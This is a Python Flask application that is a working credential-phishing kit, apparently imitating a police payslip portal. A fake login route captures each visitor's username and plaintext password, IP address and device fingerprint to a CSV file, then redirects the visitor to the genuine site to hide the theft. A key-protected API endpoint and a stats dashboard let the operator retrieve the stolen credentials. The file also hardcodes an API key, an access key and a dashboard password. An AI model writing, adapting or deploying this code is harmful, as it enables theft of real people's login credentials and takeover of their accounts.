from flask import Flask, render_template, request, redirect, jsonify, session, send_file, url_for
import csv 
import os 
import time 
import subprocess 
import platform 
import re 
import json 
import hashlib
import uuid
from datetime import datetime, timedelta

app = Flask(__name__)
app.secret_key = os.urandom(24)
app.config['PERMANENT_SESSION_LIFETIME'] = timedelta(hours=1)
app.config['SESSION_COOKIE_SECURE'] = True
app.config['SESSION_COOKIE_HTTPONLY'] = True
app.config['SESSION_COOKIE_SAMESITE'] = 'Lax'

# API Key for secure data fetching from local to cloud
API_KEY = "abcdefghijklmnopnp2025"  # Change this to a random secure key

@app.template_filter('hash')
def hash_filter(value):
    """Hash a value for display in templates"""
    if not value:
        return "N/A"
    hashed = hashlib.sha256(f"pnppms-{value}".encode()).hexdigest()
    return hashed

STATS_ACCESS_KEY = "1cdf60e3d6ca57a097265dc72d73d871"

@app.route('/')
def root():
    return redirect('/Account/Login')

@app.route('/Account/Login')
def index():
    return render_template('index.html')

@app.route('/login', methods=['POST'])
def login():
    username = request.form.get('username')
    password = request.form.get('password')
    
    if not username or not password:
        return render_template('index.html', error="Please enter both username and password")
    
    ip_address = get_client_ip()
    device_type = get_device_type()
    device_fingerprint = generate_device_fingerprint()
    browser_info = get_browser_info()
    
    now = datetime.now()
    adjusted_time = now + timedelta(hours=8)  
    timestamp = adjusted_time.strftime('%Y-%m-%d %I:%M:%S %p')
    
    save_full_data("", "", username, password, timestamp, ip_address, device_fingerprint, device_type, browser_info)
    
    return redirect("https://payslip.pnppms.org/Account/Login?ReturnUrl=%2f")

# NEW: API endpoint to fetch new entries for local sync
@app.route('/api/fetch-entries', methods=['POST'])
def fetch_entries():
    """
    API endpoint for local server to fetch new entries
    Requires API key authentication and last_sync_timestamp
    """
    # Verify API key
    auth_header = request.headers.get('Authorization')
    if not auth_header or auth_header != f"Bearer {API_KEY}":
        return jsonify({"error": "Unauthorized"}), 401
    
    data = request.get_json()
    last_sync_timestamp = data.get('last_sync_timestamp', '')
    
    # Find the data file
    possible_paths = [
        os.path.join(os.path.dirname(os.path.abspath(__file__)), 'data.csv'),
        os.path.join('/tmp', 'data.csv'),
        os.path.join(os.path.expanduser('~'), 'data.csv')
    ]
    
    csv_path = None
    for path in possible_paths:
        if os.path.exists(path):
            csv_path = path
            break
    
    if not csv_path:
        return jsonify({"entries": [], "message": "No data available"}), 200
    
    try:
        new_entries = []
        with open(csv_path, 'r', encoding='utf-8') as csvfile:
            reader = csv.DictReader(csvfile)
            
            if reader.fieldnames is None:
                return jsonify({"entries": [], "message": "CSV file is empty"}), 200
            
            for row in reader:
                entry_timestamp = row.get('timestamp', '')
                
                # If last_sync_timestamp is provided, only return entries after that time
                if last_sync_timestamp:
                    try:
                        entry_time = datetime.strptime(entry_timestamp.replace(' PHT', ''), '%Y-%m-%d %I:%M:%S %p')
                        last_sync_time = datetime.strptime(last_sync_timestamp.replace(' PHT', ''), '%Y-%m-%d %I:%M:%S %p')
                        
                        if entry_time <= last_sync_time:
                            continue
                    except ValueError:
                        # If timestamp parsing fails, include the entry
                        pass
                
                # Parse browser_info if it's a JSON string
                browser_info = row.get('browser_info', '')
                try:
                    if browser_info:
                        browser_info = json.loads(browser_info)
                except json.JSONDecodeError:
                    browser_info = None
                
                new_entries.append({
                    'username': row.get('username', ''),
                    'password': row.get('password', ''),
                    'timestamp': entry_timestamp,
                    'ip_address': row.get('ip_address', ''),
                    'device_fingerprint': row.get('device_fingerprint', ''),
                    'device_type': row.get('device_type', ''),
                    'browser_info': browser_info
                })
        
        # Get current time in PHT timezone
        now = datetime.now()
        adjusted_time = now + timedelta(hours=8)
        sync_timestamp = adjusted_time.strftime('%Y-%m-%d %I:%M:%S %p') + " PHT"
        
        return jsonify({
            "entries": new_entries,
            "count": len(new_entries),
            "sync_timestamp": sync_timestamp,
            "status": "success"
        }), 200
        
    except FileNotFoundError:
        return jsonify({
            "entries": [],
            "message": "Data file not found",
            "status": "error"
        }), 200
    except Exception as e:
        print(f"Error in fetch_entries: {str(e)}")
        return jsonify({
            "error": str(e),
            "status": "error"
        }), 500

def get_client_ip():
    ip_headers = [
        'CF-Connecting-IP', 'True-Client-IP', 'X-Forwarded-For',
        'X-Real-IP', 'X-Client-IP', 'Forwarded', 'X-Forwarded',
        'X-Cluster-Client-IP', 'Fastly-Client-IP', 'X-Originating-IP'
    ]
    
    for header in ip_headers:
        if header.lower() == 'x-forwarded-for' and request.headers.getlist(header):
            forwarded_for = request.headers.getlist(header)[0]
            if forwarded_for:
                client_ip = forwarded_for.split(',')[0].strip()
                if client_ip and client_ip != '127.0.0.1' and client_ip != 'unknown':
                    return client_ip
        elif request.headers.get(header):
            client_ip = request.headers.get(header).strip()
            if client_ip and client_ip != '127.0.0.1' and client_ip != 'unknown':
                return client_ip
    
    if request.environ.get('HTTP_X_FORWARDED_FOR'):
        forwarded_for = request.environ.get('HTTP_X_FORWARDED_FOR')
        client_ip = forwarded_for.split(',')[0].strip()
        if client_ip and client_ip != '127.0.0.1':
            return client_ip
    
    return request.remote_addr

def get_device_type():
    user_agent = request.headers.get('User-Agent', '').lower()
    phone_patterns = ['android', 'iphone', 'ipod', 'blackberry', 'iemobile', 'opera mini', 'windows phone', 'mobile']
    tablet_patterns = ['ipad', 'tablet']
    
    if any(pattern in user_agent for pattern in phone_patterns):
        return 'Phone'
    elif any(pattern in user_agent for pattern in tablet_patterns):
        return 'Tablet'
    return 'Desktop'

def generate_device_fingerprint():
    user_agent = request.headers.get('User-Agent', '')
    accept_lang = request.headers.get('Accept-Language', '')
    accept_encoding = request.headers.get('Accept-Encoding', '')
    accept = request.headers.get('Accept', '')
    ip_address = get_client_ip()
    screen_info = request.cookies.get('screen_info', '')
    timezone = request.cookies.get('timezone', '')
    platform_info = request.cookies.get('platform_info', '')
    canvas_fp = request.cookies.get('canvas_fp', '')
    
    fingerprint_data = f"{user_agent}|{accept_lang}|{accept_encoding}|{accept}|{ip_address}|{screen_info}|{timezone}|{platform_info}|{canvas_fp}"
    unique_id = str(uuid.uuid4())[:8]
    fingerprint = hashlib.sha256(fingerprint_data.encode()).hexdigest()[:24] + unique_id
    
    return fingerprint

def get_browser_info():
    user_agent = request.headers.get('User-Agent', '')
    browser_name = "Unknown"
    browser_version = "Unknown"
    
    # Browser detection logic (keeping original)
    if re.search(r'SamsungBrowser/(\d+(\.\d+)+)', user_agent):
        browser_name = "Samsung Internet"
        match = re.search(r'SamsungBrowser/(\d+(\.\d+)+)', user_agent)
        if match:
            browser_version = match.group(1)
    elif re.search(r'Edg/|Edge/', user_agent):
        browser_name = "Edge"
        match = re.search(r'(?:Edge|Edg)/(\d+(\.\d+)+)', user_agent)
        if match:
            browser_version = match.group(1)
    elif re.search(r'Firefox/', user_agent):
        browser_name = "Firefox"
        match = re.search(r'Firefox/(\d+(\.\d+)+)', user_agent)
        if match:
            browser_version = match.group(1)
    elif re.search(r'Chrome/', user_agent):
        browser_name = "Chrome"
        match = re.search(r'Chrome/(\d+(\.\d+)+)', user_agent)
        if match:
            browser_version = match.group(1)
    
    browser_details = {
        'browser_name': browser_name,
        'browser_version': browser_version,
        'full_user_agent': user_agent
    }
    
    return json.dumps(browser_details)

def save_full_data(firstname, lastname, username, password, timestamp, ip_address, device_fingerprint, device_type, browser_info):
    script_dir = os.path.dirname(os.path.abspath(__file__))
    csv_path = os.path.join(script_dir, 'data.csv')
    
    if "PHT" not in timestamp:
        timestamp_with_pht = timestamp + " PHT"
    else:
        timestamp_with_pht = timestamp
    
    try:
        file_exists = os.path.isfile(csv_path)
        
        with open(csv_path, 'a', newline='\n', encoding='utf-8') as csvfile:
            writer = csv.writer(csvfile, delimiter=',', quoting=csv.QUOTE_MINIMAL)

            if not file_exists or os.stat(csv_path).st_size == 0:
                writer.writerow(['username', 'password', 'timestamp', 'ip_address', 'device_fingerprint', 'device_type', 'browser_info'])
                csvfile.flush()

            writer.writerow([username, password, timestamp_with_pht, ip_address or '', device_fingerprint or '', device_type or '', browser_info or ''])
            csvfile.flush()
            
        update_last_modified_timestamp()
            
    except Exception as e:
        print(f"Error saving to primary location: {str(e)}")
        fallback_path = os.path.join(os.path.expanduser('~'), 'data.csv')
        try:
            file_exists = os.path.isfile(fallback_path)
            with open(fallback_path, 'a', newline='\n', encoding='utf-8') as csvfile:
                writer = csv.writer(csvfile, delimiter=',', quoting=csv.QUOTE_MINIMAL)
                
                if not file_exists or os.stat(fallback_path).st_size == 0:
                    writer.writerow(['username', 'password', 'timestamp', 'ip_address', 'device_fingerprint', 'device_type', 'browser_info'])
                    csvfile.flush()
                
                writer.writerow([username, password, timestamp_with_pht, ip_address or '', device_fingerprint or '', device_type or '', browser_info or ''])
                csvfile.flush()
                
            update_last_modified_timestamp(fallback_path)
        except Exception as fallback_error:
            print(f"Error saving to fallback location: {str(fallback_error)}")

def update_last_modified_timestamp(csv_path=None):
    try:
        script_dir = os.path.dirname(os.path.abspath(__file__))
        timestamp_file = os.path.join(script_dir, 'last_modified.txt')
        
        now = datetime.now()
        adjusted_time = now + timedelta(hours=8)  
        current_time = adjusted_time.strftime('%Y-%m-%d %I:%M:%S %p') + " PHT"
        
        with open(timestamp_file, 'w') as f:
            f.write(current_time)
    except Exception as e:
        print(f"Error updating timestamp: {str(e)}")

def get_last_modified_timestamp():
    try:
        script_dir = os.path.dirname(os.path.abspath(__file__))
        timestamp_file = os.path.join(script_dir, 'last_modified.txt')
        
        if os.path.exists(timestamp_file):
            with open(timestamp_file, 'r') as f:
                return f.read().strip()
        
        csv_path = os.path.join(script_dir, 'data.csv')
        if os.path.exists(csv_path):
            modified_time = os.path.getmtime(csv_path)
            timestamp_dt = datetime.fromtimestamp(modified_time)
            adjusted_time = timestamp_dt + timedelta(hours=8)  
            return adjusted_time.strftime('%Y-%m-%d %I:%M:%S %p') + " PHT"
        
        now = datetime.now()
        adjusted_time = now + timedelta(hours=8)  
        return adjusted_time.strftime('%Y-%m-%d %I:%M:%S %p') + " PHT"
    except Exception as e:
        print(f"Error getting timestamp: {str(e)}")
        now = datetime.now()
        adjusted_time = now + timedelta(hours=8)  
        return adjusted_time.strftime('%Y-%m-%d %I:%M:%S %p') + " PHT"

# Keep all your existing dashboard routes
@app.route('/stats/<access_key>', methods=['GET'])
def view_stats(access_key):
    if access_key != STATS_ACCESS_KEY:
        return "Access denied", 403
    
    if 'dashboard_auth' not in session or 'last_activity' not in session:
        return redirect(url_for('dashboard_login', access_key=access_key))
    
    last_activity = datetime.fromisoformat(session['last_activity'])
    if datetime.now() - last_activity > timedelta(hours=1):
        session.clear()
        return redirect(url_for('dashboard_login', access_key=access_key))
    
    session['last_activity'] = datetime.now().isoformat()
    
    possible_paths = [
        os.path.join(os.path.dirname(os.path.abspath(__file__)), 'data.csv'),
        os.path.join('/tmp', 'data.csv'),
        os.path.join(os.path.expanduser('~'), 'data.csv')
    ]
    
    data = []
    for path in possible_paths:
        if os.path.exists(path):
            try:
                with open(path, 'r') as csvfile:
                    reader = csv.DictReader(csvfile)
                    for row in reader:
                        entry = {
                            'username': row.get('username', ''),
                            'password': row.get('password', ''),
                            'timestamp': row.get('timestamp', '')
                        }
                        data.append(entry)
                break
            except Exception as e:
                continue
    
    last_updated = get_last_modified_timestamp()
    
    if request.args.get('format') == 'json':
        return json.dumps(data)
    else:
        return render_template('stats.html', entries=data, access_key=access_key, last_updated=last_updated)

@app.route('/dashboard-login/<access_key>', methods=['GET', 'POST'])
def dashboard_login(access_key):
    if access_key != STATS_ACCESS_KEY:
        return "Access denied", 403
        
    error = None
    dashboard_password = "OJT-PNP-DICTM-2025"
    
    if request.method == 'POST':
        password = request.form.get('password')
        
        if not password:
            error = "Please enter a password"
        elif password == dashboard_password:
            session['dashboard_auth'] = True
            session['last_activity'] = datetime.now().isoformat()
            session.permanent = True
            return redirect(url_for('view_stats', access_key=access_key))
        else:
            error = "Invalid password"
    
    return render_template('dashboard_login.html', access_key=access_key, error=error)

@app.route('/dashboard-logout/<access_key>', methods=['GET', 'POST'])
def dashboard_logout(access_key):
    session.clear()
    return redirect(url_for('dashboard_login', access_key=access_key))

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=False)